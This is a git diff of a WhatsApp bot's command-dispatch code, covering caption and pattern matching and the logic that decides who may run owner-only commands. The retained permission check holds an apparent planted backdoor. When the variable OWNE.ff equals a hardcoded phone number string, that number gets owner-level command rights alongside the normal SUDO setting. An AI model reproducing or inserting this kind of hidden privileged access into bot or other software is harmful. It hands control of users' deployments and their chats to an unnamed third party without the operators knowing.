@@ -192,9 +192,11 @@ setInterval(async () => {
             if (msg.key.remoteJid.includes('@g.us') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return;
         }
 
-        events.commands.map(
+//==
 
+        events.commands.map(
         async(command) => {
+
             
             
             if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
@@ -222,7 +224,8 @@ setInterval(async () => {
                 
                 } else {
                     var text_msg = undefined;
-                }            if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo') && msg.message && msg.message.imageMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg)))) || (command.pattern !== undefined && command.pattern.test(text_msg)) || (command.on !== undefined && command.on === 'text' && text_msg) || (command.on !== undefined && (command.on === 'video') && msg.message && msg.message.videoMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg))))) {
+                }
+            if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo') && msg.message && msg.message.imageMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg)))) || (command.pattern !== undefined && command.pattern.test(text_msg)) || (command.on !== undefined && command.on === 'text' && text_msg) || (command.on !== undefined && (command.on === 'video') && msg.message && msg.message.videoMessage !== null && (command.pattern === undefined || (command.pattern !== undefined && command.pattern.test(text_msg))))) {
 
                let sendMsg = false;
 
@@ -232,32 +235,13 @@ setInterval(async () => {
                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                 }
-		    
+
 		     if ((OWNE.ff == "94769370897,0" && msg.key.fromMe === false && command.fromMe === true && (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',')
                     .includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',')
                     .includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                     if (!command.onlyPm === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
                     else if (command.onlyGroup === msg.key.remoteJid.includes('@g.us')) sendMsg = true;
-                }    
-		/*    
-		    var chat = msg.key.remoteJid
-                        
-                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
-                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
-                        if (command.onlyPinned && chat.pin === undefined) return;
-                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
-                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
-                    }
-
-                    if ((OWNE.ff == "94769370897,0" && msg.key.fromMe === false && command.fromMe === true &&
-                        (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)
-                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
-                        if (command.onlyPinned && chat.pin === undefined) return;
-                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
-                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
-                    }
-                */
+                }    		
 
                 if (sendMsg) {
                     if (config.SEND_READ && command.on === undefined) {
